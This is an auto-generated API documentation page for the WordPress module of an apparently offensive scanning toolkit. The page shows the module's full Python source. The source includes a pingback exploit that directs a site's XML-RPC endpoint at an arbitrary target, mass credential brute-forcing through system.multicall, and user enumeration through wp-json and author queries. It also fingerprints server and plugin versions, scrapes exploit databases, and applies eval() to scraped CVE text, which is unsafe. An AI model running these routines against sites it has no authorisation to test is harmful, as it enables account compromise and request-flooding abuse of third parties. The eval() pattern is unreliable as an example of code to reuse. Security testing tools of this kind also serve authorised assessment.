<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, minimum-scale=1" name="viewport">
<meta content="pdoc 0.10.0" name="generator"/>
<title>bane.scanners.cms.wp API documentation</title>
<meta content="" name="description"/>
<link as="style" crossorigin="" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" rel="preload stylesheet"/>
<link as="style" crossorigin="" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" rel="preload stylesheet"/>
<link as="style" crossorigin="" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" rel="stylesheet preload"/>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script crossorigin="" defer="" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</meta></head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.scanners.cms.wp</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.scanners.cms.utils import *




def wp_xmlrpc_methods(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None,headers={}
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
"""
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        return [
            x.replace("&lt;/string&gt;&lt;/value&gt;", "").replace("&lt;value&gt;&lt;string&gt;", "").strip()
            for x in r.text.split("&lt;data&gt;")[1].split("&lt;/data&gt;")[0].strip().split("\n")
        ]
    except:
        pass
    return []


def wp_xmlrpc_bruteforce(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None,headers={}
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
"""
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if "wp.getUsersBlogs" in [
            x.replace("&lt;/string&gt;&lt;/value&gt;", "").replace("&lt;value&gt;&lt;string&gt;", "").strip()
            for x in r.text.split("&lt;data&gt;")[1].split("&lt;/data&gt;")[0].strip().split("\n")
        ]:
            return True
    except:
        pass
    return False


def wp_xmlrpc_mass_bruteforce(
    u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None, headers={}
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
"""
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace("&lt;/string&gt;&lt;/value&gt;", "").replace("&lt;value&gt;&lt;string&gt;", "").strip()
            for x in r.text.split("&lt;data&gt;")[1].split("&lt;/data&gt;")[0].strip().split("\n")
        ]
        if ("wp.getUsersBlogs" in l) and ("system.multicall" in l):
            return True
    except:
        pass
    return False


def wp_xmlrpc_pingback(
    u,
    user_agent=None,
    test_url="https://www.google.com/",
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
    headers={}
):
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
"""
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace("&lt;/string&gt;&lt;/value&gt;", "").replace("&lt;value&gt;&lt;string&gt;", "").strip()
            for x in r.text.split("&lt;data&gt;")[1].split("&lt;/data&gt;")[0].strip().split("\n")
        ]
        if "pingback.ping" in l:
            return True
    except:
        pass
    return False


def wp_xmlrpc_pingback_exploit(
    u,
    user_agent=None,
    target_url="https://www.google.com/",
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
    headers={}
):
    url = u.split("://")[0] + "://" + urlparse(u).netloc
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    url += path
    post = (
        """&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;"""
        + target_url
        + """&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;"""
        + u
        + """&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
"""
    )
    try:
        r = requests.Session().post(
            url, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
    except:
        pass


def wpadmin(
    u,
    username,
    password,
    user_agent=None,
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
    headers={}
):
    """
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False"""
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """&lt;methodCall&gt;
&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;{}&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;{}&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;""".format(
        username, password
    )
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if "isAdmin" in r.text:
            return True
    except:
        pass
    return False


def wpadmin_mass(
    u,
    word_list=[],
    user_agent=None,
    cookie=None,
    path="/xmlrpc.php",
    timeout=10,
    proxy=None,
    headers={}
):
    """
    this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False"""
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    u += path
    post = """
 &lt;?xml version="1.0"?&gt;
&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
 """
    for x in word_list:
        post += """&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;
  &lt;data&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;{}&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;{}&lt;/string&gt;&lt;/value&gt;
  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;
""".format(
            x.split(":")[0], x.split(":")[1]
        )
    post += """
&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;
 """
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = (
            r.text.split("&lt;array&gt;&lt;data&gt;")[1]
            .split("&lt;/array&gt;&lt;/data&gt;")[0]
            .strip()
            .split("&lt;/struct&gt;&lt;/value&gt;")
        )
        for x in l:
            if "Incorrect username or password" not in x:
                return word_list[l.index(x)]
    except:
        pass
    return ""


def wp_users(
    u, path="/wp-json/wp/v2/users", timeout=10, user_agent=None, cookie=None, proxy=None, headers={}
):
    """
    this function is to get WP users"""
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    u += path
    try:
        r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if ('{"id":' in r.text) and ('"name":"' in r.text):
            a = json.loads(r.text)
            users = []
            for x in range(len(a)):
                users.append(
                    {"id": a[x]["id"], "slug": a[x]["slug"], "name": a[x]["name"]}
                )
            return users
    except Exception as e:
        return []
    return []


def wp_user(
    u,
    path="/wp-json/wp/v2/users/",
    user=1,
    user_agent=None,
    cookie=None,
    timeout=10,
    proxy=None,
    headers={}
):
    """
    this function is to return all informations about a WP user with a given index integer"""
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    hed.update(headers)
    u += path + str(user)
    try:
        r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if ('{"id":' in r.text) and ('"name":"' in r.text):
            return json.loads(r.text)
    except Exception as e:
        pass


def wp_users_enumeration(
    u,
    path="/",
    timeout=15,
    user_agent=None,
    cookie=None,
    proxy=None,
    start=1,
    end=20,
    logs=True,
    headers={}
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    d = u.split("://")[1].split("/")[0]
    u = u.split(d)[0] + d
    l = []
    for x in range(start, end + 1):
        try:
            r = requests.Session().get(
                u + path + "?author=" + str(x),
                headers=hed,
                proxies=proxy,
                timeout=timeout,
                verify=False,
            ).text
            a = r.split('&lt;meta property="og:title" content="')[1].split("&gt;")[0]
            b=r.split('&lt;meta property="og:url" content="')[1].split("&gt;")[0]
            c=b.split('/author/')[1].split('/')[0]
            if "," in a:
                a = a.split(",")[0]
                l.append({'id':x, 'name':a,'slug':c})
                if logs == True:
                    print(
                        "\t[+] id: {} | name: {} | slug: {}".format(
                            x,#.encode("utf-8", "replace"), 
                            a,
                            c
                        )
                    )
        except KeyboardInterrupt:
            break
        except:
            pass
    return l


def wp_version(u, timeout=15, user_agent=None, cookie=None, proxy=None,headers={}):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    try:
        r = requests.Session().get(
            u, headers=hed, proxies=proxy, timeout=timeout, verify=False
        ).text
        return (
            r.split('&lt;meta name="generator" content="')[1]
            .split('"')[0]
            .strip()
            .split(" ")[1]
        )
    except:
        pass



def version_string_to_list(version):
    return [int(x) for x in version.split('.')]




def extract_with_versions(cve_list,software_version):
    results = []
    for cve in cve_list:
        title = cve['title']
        try:
            version = [ x.strip() for x in title.split() if '.' in x and x.endswith('.')==False and x.startswith('.')==False][0]
        except:
            version=''
        if version!='':
            try:
                c=title.split(version)[0].split()
                if c[-1].strip()=='&lt;':
                    comparison='&lt;'
                elif c[-1].strip()=='&gt;':
                    comparison='&gt;'
                elif c[-1].strip()=='&lt;=':
                    comparison='&lt;='
                else:
                    comparison='=='
            except:
                comparison='=='
        if version=='':
            version=software_version
        if '-' not in version:
            if eval('{}{}{}'.format(version_string_to_list(software_version),comparison,version_string_to_list(version)))==True:
                results.append(cve)
        else:
            if eval('{}&gt;{} and {}&lt;{}'.format(version_string_to_list(software_version),version_string_to_list(version.split('-')[0].strip()),version_string_to_list(software_version),version_string_to_list(version.split('-')[1].strip())))==True:
                results.append(cve)
    return results




def fetch_wp_exploits(s,max_tries=3,proxy=None,user_agent=None,timeout=15,cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30):
    if s['version'].strip()=='':
        return []
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    i=1
    l=[]
    result=[]
    tries=0
    while True:
        tries+=1
        #print(tries)
        if tries==max_tries:
            break
        try:
            r=requests.Session().get('https://wpscan.com/search?page={}&amp;text={}'.format(i,s['name']),headers=hed,timeout=timeout,proxies=proxy,verify=False).text
            #print(r)
            data=json.loads(r.split('"pageData":{"props":{"data":')[1].split(',"metadata":{"pageCount":')[0])
            if len(data)==0:
                break
            l+=data
            i+=1
            tries=0
        except Exception as ex:
            #raise(ex)
            time.sleep(when_blocked_sleep)
        time.sleep(random.randint(sleep_time_min,sleep_time_max))
    for x in l:
        x['exploit_url']='https://wpscan.com/vulnerability/'+x['id']
    return extract_with_versions(l,s['version'])



def get_wp_infos(u,max_wpscan_tries=3,cookie=None,user_agent=None,timeout=15,proxy=None,user_enum_start=1,user_enum_end=20,wpscan_cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30,logs=True,crt_timeout=120,wayback_timeout=120,subdomain_check_timeout=10,max_wayback_urls=10,subdomains_only=True,headers={},api_key=None):
    domain=u.split('://')[1].split('/')[0].split(':')[0]
    root_domain=extract_root_domain(domain)
    ip=socket.gethostbyname(domain.split(':')[0])
    if u[len(u) - 1] == "/":
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    hed.update(headers)
    response = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
    server=response.headers.get('Server','')
    try:
        server_os=[x for x in server.split() if x.startswith('(')==True][0].replace('(','').replace(')','')
    except:
        server_os=''
    backend=response.headers.get('X-Powered-By','')
    html_content = response.text

    # Parse the HTML content
    soup = BeautifulSoup(html_content, 'html.parser')

    # Find themes and plugins information
    themes = []
    plugins = []
    try:
        #print(response.split('&lt;meta name="generator" content="')[1].split('"')[0])
        wp_version=response.text.lower().split('&lt;meta name="generator" content="wordpress')[1].split('"')[0].strip()
    except Exception as ex:
        #raise(ex)
        wp_version=''
    # Extract themes
    if logs==True:
        print("WordPress site info:\n\n\tURL: {}\n\tDomain: {}\n\tIP: {}\n\tServer: {}\n\tOS: {}\n\tBackend technology: {}\n\tWordPress version: {}\n".format(u,domain,ip,server,server_os,backend,wp_version))
    clickj=page_clickjacking(u,request_headers=response.headers)
    if logs==True:
        print("[i] Looking for subdomains...")
    subs=get_subdomains(root_domain,logs=logs, crt_timeout=crt_timeout,user_agent=user_agent,cookie=cookie,wayback_timeout=wayback_timeout,subdomain_check_timeout=subdomain_check_timeout,max_wayback_urls=max_wayback_urls,proxy=proxy,subdomains_only=subdomains_only)
    if logs==True:
        print("[i] Cheking if we can sniff some cookies over some links...")
        print()
    media_non_ssl=sniffable_links(u,content=response.text,logs=logs,request_headers=response.headers)
    if logs==True:
        print()
    theme_links = soup.find_all('link', rel='stylesheet')
    for link in theme_links:
        href = link.get('href')
        #print(href)
        if 'themes' in href:
            try:
                theme_name = href.split('/themes/')[1].split('/')[0]
                try:
                    version=href.split('?')[1].split('=')[1]
                except:
                    version=''
                theme={'name':theme_name,'version':version}
                if theme not in themes:
                    themes.append(theme)
            except:
                pass
        elif 'plugins' in href:
            try:
                plugin_name = href.split('/plugins/')[1].split('/')[0]
                try:
                    version=href.split('?')[1].split('=')[1]
                except:
                    version=''
                plugin={'name':plugin_name,'version':version}
                if plugin not in plugins:
                    plugins.append(plugin)
            except:
                pass
    users_json_exposed=True
    json_path=u+'/wp-json/wp/v2/users'
    if logs==True:
        print('[i] Fetching users from: {}'.format(json_path))
    json_users=wp_users(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,headers=headers)
    if logs==True:
        for x in json_users:
            print('\t[+] id: {} | name: {} | slug: {}'.format(x['id'],x['name'],x['slug']))
        print()
    if json_users==[]:
        users_json_exposed=False
    can_enumerate_users=True
    if logs==True:
        print('[i] Trying enumerating the authors...')
    enumerated_users= wp_users_enumeration(u,logs=logs,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,start=user_enum_start,end=user_enum_end,headers=headers)
    if enumerated_users==[]:
        can_enumerate_users=False
    else:
        if logs==True:
            print()
            for x in enumerated_users:
                print('\t[+] id: {} | name: {} | slug: {}'.format(x['id'],x['name'],x['slug']))
    if logs==True:
        print()
        print('[i] Checking if XMLRPC is enabled from: {}'.format(u+'/xmlrpc.php'))
    xmlrpcs=wp_xmlrpc_methods(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,headers=headers)
    can_b_u=("wp.getUsersBlogs" in xmlrpcs) and ("system.multicall" in xmlrpcs)
    can_pb="pingback.ping" in xmlrpcs
    if logs==True:
        if len(xmlrpcs)&gt;0:
            print('[+] enabled')
            if can_b_u==True:
                print('\t[+] Vulnerable to users bruteforce')
            if can_pb==True:
                print('\t[+] Vulnerable to pingback')
        else:
            print('\t[-] disabled')
        print()
    wp_vulns=[]
    if wp_version!='':
        if logs==True:
            print('[i] looking for exploits for version: {}\n'.format(wp_version))
        wpvulns=vulners_search('wordpress',version=wp_version,proxy=proxy,api_key=api_key)
        for x in wpvulns:
            if 'wordpress' in x['title'].lower() or 'wordpress' in x['description'].lower():
                wp_vulns.append(x)
        for x in wp_vulns:
            for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                try:
                    del x[i]
                except:
                    pass
        if logs==True:
            if len(wp_vulns)==0:
                print('\t[-] none was found')
            else:
                for x in wp_vulns:
                    print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                    print()
    backend_technology_exploits={}
    if backend!='':
        bk=[]
        for back in backend.split():
            if logs==True:
                print('[i] looking for exploits for : {}\n'.format(back))
            if '/' not in back:
                if logs==True:
                    print('\t[-] unknown version\n')
            else:
                bk=vulners_search(back.split('/')[0].lower(),version=back.split('/')[1],proxy=proxy,api_key=api_key)
            for x in bk:
                for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                    try:
                        del x[i]
                    except:
                        pass
            backend_technology_exploits.update({back:bk})
            if logs==True:
                if len(bk)==0:
                    print('\t[-] none was found')
                else:
                    for x in bk:
                        print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                        print()
    server_exploits={}
    if server!='':
        for sv in server.split():
            if sv.startswith('(')==False:
                sv_e=[]
                if logs==True:
                    print('[i] looking for exploits for : {}\n'.format(sv))
                if '/' in sv:
                    sv_e=vulners_search(sv.split('/')[0].lower(),version=sv.split('/')[1],proxy=proxy,api_key=api_key)
                else:
                    if logs==True:
                        print('\t[-] unknown version\n')
                for x in sv_e:
                    for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                        try:
                            del x[i]
                        except:
                            pass
                server_exploits.update({sv:sv_e})
                if logs==True:
                    if len(sv_e)==0:
                        print('\t[-] none was found')
                    else:
                        for x in sv_e:
                            print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                            print()
    if len(themes)&gt;0:
        if logs==True:
            print('[i] looking for exploits for the themes:\n')
    for x in themes:
        if logs==True:
            print('[i] Theme: {} | Version: {}\n'.format(x['name'],x['version']))
        x['exploits']=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x['exploits']:
                print("\tTitle: {}\n\tLink: {}".format(i['title'],i['exploit_url']))
                print()
    if len(plugins)&gt;0:
        if logs==True:
            print()
            print('[i] looking for exploits for the plugins:\n')
    for x in plugins:
        if logs==True:
            print('[i] Plugin: {} | Version: {}\n'.format(x['name'],x['version']))
        x['exploits']=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x['exploits']:
                print("\tTitle: {}\n\tLink: {}".format(i['title'],i['exploit_url']))
                print()
    return {'url':u,'domain':domain,'ip':ip,'root_domain':root_domain,'sub_domains':subs,'server':server,'os':server_os,'backend_technology':backend,'wordpress_version':wp_version,'sniffable_links':media_non_ssl,'clickjackable':clickj,'themes':themes,'plugins':plugins,'users_json_exposed':users_json_exposed,'exopsed_json_users':{'users':json_users,'path':json_path},'can_enumerate_users':can_enumerate_users,'enumerated_users':enumerated_users,'enabled_xmlrpc_methods':xmlrpcs,"xmlrpc_bruteforce_users":can_b_u,"pingback_enabled":can_pb,"exploits":wp_vulns,'backend_technology_exploits':backend_technology_exploits,'server_exploits':server_exploits}</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="bane.scanners.cms.wp.extract_with_versions"><code class="name flex">
<span>def <span class="ident">extract_with_versions</span></span>(<span>cve_list, software_version)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_with_versions(cve_list,software_version):
    results = []
    for cve in cve_list:
        title = cve['title']
        try:
            version = [ x.strip() for x in title.split() if '.' in x and x.endswith('.')==False and x.startswith('.')==False][0]
        except:
            version=''
        if version!='':
            try:
                c=title.split(version)[0].split()
                if c[-1].strip()=='&lt;':
                    comparison='&lt;'
                elif c[-1].strip()=='&gt;':
                    comparison='&gt;'
                elif c[-1].strip()=='&lt;=':
                    comparison='&lt;='
                else:
                    comparison='=='
            except:
                comparison='=='
        if version=='':
            version=software_version
        if '-' not in version:
            if eval('{}{}{}'.format(version_string_to_list(software_version),comparison,version_string_to_list(version)))==True:
                results.append(cve)
        else:
            if eval('{}&gt;{} and {}&lt;{}'.format(version_string_to_list(software_version),version_string_to_list(version.split('-')[0].strip()),version_string_to_list(software_version),version_string_to_list(version.split('-')[1].strip())))==True:
                results.append(cve)
    return results</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.fetch_wp_exploits"><code class="name flex">
<span>def <span class="ident">fetch_wp_exploits</span></span>(<span>s, max_tries=3, proxy=None, user_agent=None, timeout=15, cookie=None, sleep_time_min=10, sleep_time_max=20, when_blocked_sleep=30)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def fetch_wp_exploits(s,max_tries=3,proxy=None,user_agent=None,timeout=15,cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30):
    if s['version'].strip()=='':
        return []
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {"User-Agent": us}
    if cookie:
        hed.update({"Cookie": cookie})
    i=1
    l=[]
    result=[]
    tries=0
    while True:
        tries+=1
        #print(tries)
        if tries==max_tries:
            break
        try:
            r=requests.Session().get('https://wpscan.com/search?page={}&amp;text={}'.format(i,s['name']),headers=hed,timeout=timeout,proxies=proxy,verify=False).text
            #print(r)
            data=json.loads(r.split('"pageData":{"props":{"data":')[1].split(',"metadata":{"pageCount":')[0])
            if len(data)==0:
                break
            l+=data
            i+=1
            tries=0
        except Exception as ex:
            #raise(ex)
            time.sleep(when_blocked_sleep)
        time.sleep(random.randint(sleep_time_min,sleep_time_max))
    for x in l:
        x['exploit_url']='https://wpscan.com/vulnerability/'+x['id']
    return extract_with_versions(l,s['version'])</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.get_wp_infos"><code class="name flex">
<span>def <span class="ident">get_wp_infos</span></span>(<span>u, max_wpscan_tries=3, cookie=None, user_agent=None, timeout=15, proxy=None, user_enum_start=1, user_enum_end=20, wpscan_cookie=None, sleep_time_min=10, sleep_time_max=20, when_blocked_sleep=30, logs=True, crt_timeout=120, wayback_timeout=120, subdomain_check_timeout=10, max_wayback_urls=10, subdomains_only=True, headers={}, api_key=None)</span>
</code></dt>
<dd>
